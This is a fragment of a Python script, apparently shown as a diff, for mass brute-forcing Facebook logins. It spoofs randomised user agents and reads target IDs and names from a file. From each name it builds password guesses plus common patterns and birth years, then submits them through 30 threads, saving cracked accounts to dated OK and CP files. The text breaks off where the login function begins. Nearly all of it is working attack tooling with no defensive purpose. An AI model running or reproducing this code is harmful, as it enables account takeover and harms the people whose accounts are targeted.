'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.75 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.80 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.125 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/4.0)', 'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.127 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/4.0)', 'Mozilla/5.0 (Windows NT 5.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.89 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/4.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (X11; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.81 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:47.0) Gecko/20100101 Firefox/47.0']
+ugen2=['Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.96 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; WOW64; Trident/5.0)', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0)', 'Mozilla/5.0 (X11; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Win64; x64; Trident/6.0)', 'Mozilla/5.0 (X11; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.101 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.121 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.110 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (X11; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.0; Win64; x64; Trident/5.0)', 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Trident/6.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.99 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Win64; x64; Trident/6.0)', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.111 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; Trident/4.0)', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Windows NT 6.3; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.101 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.127 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Win64; x64; Trident/6.0)', 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.110 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.185 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.120 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Windows NT 6.3; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (Windows NT 10.0; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.75 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.80 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.125 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/4.0)', 'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.127 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/4.0)', 'Mozilla/5.0 (Windows NT 5.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.89 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/4.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (X11; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.81 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:47.0) Gecko/20100101 Firefox/47.0']
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+
+for xd in range(10000):
+	a='Nokia5350/10.1.011 (SymbianOS/10;'
+	b=random.randrange(1, 9)
+	c=random.randrange(1, 9)
+	d='Series63/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1)'
+	e=random.randrange(100, 9999)
+	f='AppleWebKit/525 (KHTML, like Gecko)'
+	g=random.randrange(1, 9)
+	h=random.randrange(1, 4)
+	i=random.randrange(1, 4)
+	j=random.randrange(1, 4)
+	k='Safari/525 3gpp-gba'
+	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+	ugen2.append(uaku)    
+	
+	aa='NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (SymbianOS/9.2; U;'
+	b=random.choice(['7.0','8.1.0','9','10','11','12'])
+	c=random.choice(['Series60/3.1 NokiaE71-1/100.07.57; Profile/MIDP-2.0 Configuration/CLDC-1.1 )'])
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/413 (KHTML, like Gecko)'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Safari/413 UNTRUSTED/1.0'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+	
+	aa='NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 12;'
+	b=random.choice(['7.0','8.1.0','9','10','11','12'])
+	c=random.choice(['SAMSUNG SM-X906B)'])
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko)'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Chrome/100.0.4896.88 Safari/537.36 UNTRUSTED/1.0'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+	
+	aa='NokiaC1-01/2.0 (06.15) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US;'
+	b=random.choice(['7.0','8.1.0','9','10','11','12'])
+	c=random.choice(['nokiac1-01)'])
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='U2/1.0.0 UCBrowser/8.9.0.251'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='U2/1.0.0 Mobile UNTRUSTED/1.06'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
+cokbrut=[]
+pwpluss,pwnya=[],[]
+
+P = '\x1b[1;97m'
+M = '\x1b[1;91m'
+H = '\x1b[1;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m'
+N = '\x1b[0m'    
+Z = "\033[1;30m"
+sir = '\033[41m\x1b[1;97m'
+x = '\33[m' # DEFAULT
+m = '\x1b[1;91m' #RED +
+k = '\033[93m' # KUNING +
+h = '\x1b[1;92m' # HIJAU +
+hh = '\033[32m' # HIJAU -
+u = '\033[95m' # UNGU
+kk = '\033[33m' # KUNING -
+b = '\33[1;96m' # BIRU -
+p = '\x1b[0;34m' # BIRU +
+#asu = random.choice([m,k,h,u,b])
+AB_A='\x1b[1;97m' # ابيض خط عربض
+RS='\x1b[30m' #رصاصي
+AH_F='\x1b[31m'   #احمر فاتح
+AKH_F='\x1b[32m' #اخضر فاتح
+AS_T='\x1b[33m'#اصفر طوخ
+SM='\x1b[34m'  #سمائي
+BN='\x1b[35m'#بنفسجي
+AZ_T='\x1b[36m'  #ازرك طوخ
+AB_KH='\x1b[37m' #ابيض خط خفيف
+AH_T='\x1b[91m'  #احمر طوخ
+AKH_T='\x1b[92m'#اخضر طوخ
+AS_F='\x1b[93m'    #اصفر فاتح
+WR='\x1b[95m'      #وردي
+p='\x1b[38;5;208m' #برتقالي
+AH2='\x1b[38;5;204m' 
+AS2='\x1b[38;5;220m'
+MJ='\x1b[38;5;193m'
+MJ2='\x1b[38;5;216m'
+MJ3='\x1b[38;5;190m'
+O='\x1b[0;96m'     # Biru Muda
+P='\x1b[38;5;231m' # Putih
+J='\x1b[38;5;208m' # Jingga
+MJ4='\x1b[38;5;106m'
+asu=random.choice([m,O,h,u,b,MJ3,MJ2,MJ,AS2,AH2,B,WR,AS_F,AKH_T,AH_T,AB_KH,AZ_T,BN,SM,AS_T,AKH_F,AH_F,RS,AB_A,Z,p,b,kk,hh,x,Y,P,u,B,J,MJ4,p])
+
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
+dic = {'1':'jan','2':'feb','3':'mar','4':'apr','5':'may','6':'jun','7':'jul','8':'aug','9':'sep','10':'oct','11':'nov','12':'dec'}
+dic2 = {'1':'jan','2':'feb','3':'mar','4':'apr','5':'may','6':'jun','7':'jul','8':'aug','9':'sep','10':'oct','11':'nov','12':'dec'}
+ua = 'Mozilla/5.0 (Linux; Android 10; LIO-N29; HMSCore 6.4.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.1.302 Mobile Safari/537.3'
+###########################################################################################
+tgl = datetime.datetime.now().day
+bln = dic[(str(datetime.datetime.now().month))]
+thn = datetime.datetime.now().year
+okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+
+def xox(z):
+	for e in z + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(0.01)
+		
+		
+def banner():
+	print(a12+'نمرود SDM ')
+a1 = '\x1b[1;31m'  # أحمر
+a2 = '\x1b[1;34m'  # أزرق
+a3 = '\x1b[1;32m'  # أخضر
+a4 = '\x1b[1;33m'  # أصفر
+a5 = '\x1b[38;5;208m'  # برتقالي
+a6 = '\x1b[38;5;5m'  # أرجواني
+a7 = '\x1b[38;5;13m'  # وردي
+a8 = '\x1b[1;30m'  # أسود
+a9 = '\x1b[1;37m'  # أبيض
+a10 = '\x1b[38;5;52m'  # بني
+a11 = '\x1b[38;5;8m'  # رمادي
+a12 = '\x1b[38;5;220m'  # ذهبي
+a13 = '\x1b[38;5;7m'  # فضي
+a14 = '\x1b[38;5;153m'  # أزرق فاتح
+a15 = '\x1b[38;5;18m'  # أزرق داكن
+a16 = '\x1b[38;5;153m'  # أخضر فاتح
+a17 = '\x1b[38;5;22m'  # أخضر داكن
+a18 = '\x1b[38;5;196m'  # أحمر فاتح
+a19 = '\x1b[38;5;88m'  # أحمر داكن
+a20 = '\x1b[38;5;226m'  # أصفر فاتح
+a21 = '\x1b[38;5;136m'  # أصفر داكن
+a22 = '\x1b[38;5;216m'  # برتقالي فات
+a23 = '\x1b[38;5;166m'  # برتقالي داكن
+a24 = '\x1b[38;5;234m'  # أرجواني فاتح
+a25 = '\x1b[38;5;91m'  # أرجواني داكن
+a26 = '\x1b[38;5;205m'  # وردي فاتح
+a27 = '\x1b[38;5;161m'  # وردي داكن
+a28 = '\x1b[38;5;236m'  # أسود فاتح
+a29 = '\x1b[38;5;233m'  # أسود داكن
+a30 = '\x1b[38;5;255m'  # أبيض فاتح
+a31 = '\x1b[38;5;231m'  # أبيض داكن
+a32 = '\x1b[38;5;180m'  # بني فاتح
+a33 = '\x1b[38;5;94m'  # بني داكن
+a34 = '\x1b[38;5;252m'  # رمادي فاتح
+a35 = '\x1b[38;5;246m'  # رمادي داكن
+a36 = '\x1b[38;5;228m'  # ذهبي فاتح
+a37 = '\x1b[38;5;172m'  # ذهبي داكن
+a38 = '\x1b[38;5;188m'  # فضي فاتح
+a39 = '\x1b[38;5;247m'  # فضي داكن
+a40 = '\x1b[38;5;117m'  # أزرق سماوي8
+	
+#------------------[ BAGIAN-MENU ]----------------#
+def SDM():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		print('[×] Cookies NO ')
+		time.sleep(5)
+		SDMM()
+	os.system('clear')
+	banner()
+	print(f'[ 01 ] FILE CLONE| صـيد من ملف') 
+	print(f'[ 00 ] Exit | خـࢪوج') 
+	_____IPYTHONI_____ = input(a31+'Select :\x1b[1;97m ')
+	if _____IPYTHONI_____ in ['1','01']:
+		F()
+	elif _____IPYTHONI_____ in ['0','00']:
+		sys.exit()
+	else:
+		print(a20+'NOT SELECT ')
+		back()
+def error():
+	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;91m~~~~~Main menu~~~~~')
+	time.sleep(2)
+	back()
+def F():
+    banner()
+    D().plerr()
+
+class D:
+	def __init__(self):
+		self.id = []
+	def plerr(self):
+		os.system("clear")
+		banner()
+		try:
+			fileX = input (a22+' ENTER FILE NAME : ')
+			for line in open(fileX, 'r').readlines():
+				id.append(line.strip())
+			print(a26+'TOTAL IDS : '+str(len(id)))
+			for i in range(101):
+				print("\rLoading => "+str(i)+"%",end="")
+				time.sleep(0.02)
+			Settings()
+		except IOError:
+			print("ERROR File %s"%(fileX));time.sleep(2)
+			F()
+				
+def Settings():
+	banner()
+	print(a26+' [ 01 ] Slow\n [ 02 ] Fast')
+	hu = input(a26+' Select => ')
+	if hu in ['1','01']:
+		muda=[]
+		for bacot in sorted(id):
+			muda.append(bacot)
+		bcm=len(muda)
+		bcmi=(bcm-1)
+		for xmud in range(bcm):
+			id2.append(muda[bcmi])
+			bcmi -=1
+	elif hu in ['2','02']:
+		for bacot in id:
+			xx = random.randint(0,len(id2))
+			id2.insert(xx,bacot)
+	else:
+		print(a26+'Error SELECT')
+		exit()
+	write("-"*30)
+	print(f' [ 01 ] Method Fast')
+	hc = input(a26+' Select => ')
+	if hc in ['1','01']:
+		method.append('mobile')
+	else:
+		method.append('mobile')
+	write("-"*30)
+	pwplus=input(a26+' [ 01 ] Normal\n [ 02 ] Fast\n SELECT => ')
+	if pwplus in ['y','Y']:
+		pwpluss.append('ya')
+		print(f'ExSample : qwerty,qwerty2,qwerty3')
+		pwku=input('ADD Your Password => ')
+		pwkuh=pwku.split(',')
+		for xpw in pwkuh:
+			pwnya.append(xpw)
+	else:
+		pwpluss.append('no')
+	passwrd()
+	exit()
+def write(string,slp=0.02):
+	for i in string+"\n":
+		sys.stdout.write(i)
+		sys.stdout.flush()
+		time.sleep(slp)
+def passwrd():
+
+    with tred(max_workers=30) as pool:
+        for yuzong in id2:
+            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+            frs = nmf.split(' ')[0]
+            pwv = []
+            if len(nmf)<6:
+                if len(frs)<3:
+                    pass
+                else:
+                    pwv.append(nmf)
+                    pwv.append('frs+frs')
+                    pwv.append(frs+'123')
+                    pwv.append(frs+'1234')
+                    pwv.append('firstlast')
+                    pwv.append('first123')
+                    pwv.append('first1234567')
+                    pwv.append(frs+"123123")
+                    pwv.append('١٢٣٤٥٦')
+                    pwv.append('١٢٣٤٥٦٧٨٩')
+                    pwv.append('77889900')
+                    pwv.append('00009999')
+                    pwv.append('mmnnbbvv')
+                    pwv.append('ppooiiuuyy')
+                    pwv.append('zzxxccvv')
+                    pwv.append('qqwweerr')
+                    pwv.append('zxcvzxcv')
+                    pwv.append('qwertyuiopasdfghjkl')
+                    pwv.append('0099887766')
+                    pwv.append('1020304050')
+                    pwv.append('102030405060708090')
+                    pwv.append('112233445566778899')
+                    pwv.append('00998877665544332211')
+                    pwv.append('1122334455@@')
+                    pwv.append('20042004')
+                    pwv.append('20032003')
+                    pwv.append('20022002')
+                    pwv.append('20202020')
+                    pwv.append('20222022')
+                    pwv.append('20232023')
+                    pwv.append('19801980')
+                    pwv.append('19901990')
+                    pwv.append('19911991')
+                    pwv.append('19921992')
+                    pwv.append('19931993')
+                    pwv.append('19941994')
+                    pwv.append('19951995')
+                    pwv.append('19961996')
+                    pwv.append('19971997')
+                    pwv.append('19981998')
+                    pwv.append('19991999')
+            else:
+                if len(frs)<3:
+                    pwv.append(nmf)
+                else:
+                    pwv.append(nmf)
+                    pwv.append('frs+frs')
+                    pwv.append(frs+'123')
+                    pwv.append(frs+'1234')
+                    pwv.append('firstlast')
+                    pwv.append('first123')
+                    pwv.append('first1234567')
+                    pwv.append(frs+"123123")
+                    pwv.append('١٢٣٤٥٦')
+                    pwv.append('١٢٣٤٥٦٧٨٩')
+                    pwv.append('77889900')
+                    pwv.append('00009999')
+                    pwv.append('mmnnbbvv')
+                    pwv.append('ppooiiuuyy')
+                    pwv.append('zzxxccvv')
+                    pwv.append('qqwweerr')
+                    pwv.append('zxcvzxcv')
+                    pwv.append('qwertyuiopasdfghjkl')
+                    pwv.append('0099887766')
+                    pwv.append('1020304050')
+                    pwv.append('102030405060708090')
+                    pwv.append('112233445566778899')
+                    pwv.append('00998877665544332211')
+                    pwv.append('1122334455@@')
+                    pwv.append('12345@@@@@')
+                    pwv.append('1122334455@@@@@')
+                    pwv.append('20042004')
+                    pwv.append('20032003')
+                    pwv.append('20022002')
+                    pwv.append('20202020')
+                    pwv.append('20212021')
+                    pwv.append('20222022')
+                    pwv.append('20232023')
+                    pwv.append('19801980')
+                    pwv.append('19901990')
+                    pwv.append('19911991')
+                    pwv.append('19921992')
+                    pwv.append('19931993')
+                    pwv.append('19941994')
+                    pwv.append('19951995')
+                    pwv.append('19961996')
+                    pwv.append('19971997')
+                    pwv.append('19981998')
+                    pwv.append('19991999')
+            if 'ya' in pwpluss:
+                for xpwd in pwnya:
+                    pwv.append(xpwd)
+            else:pass
+            if 'mobile' in method:
+                pool.submit(crack,idf,pwv)
+            elif 'free' in method:
+                pool.submit(crackfree,idf,pwv)
+            elif 'touch' in method:
+                pool.submit(cracktouch,idf,pwv)
+            elif 'mbasic' in method:
+                pool.submit(crackmbasic,idf,pwv)
+            else:
+                pool.submit(crackmbasic,idf,pwv)
+    print('')
+    print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
+    print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
+def crack(idf,pwv):
+	global loop,ok,cp
+	bo = random.choice([m,k,h,b,u,x])
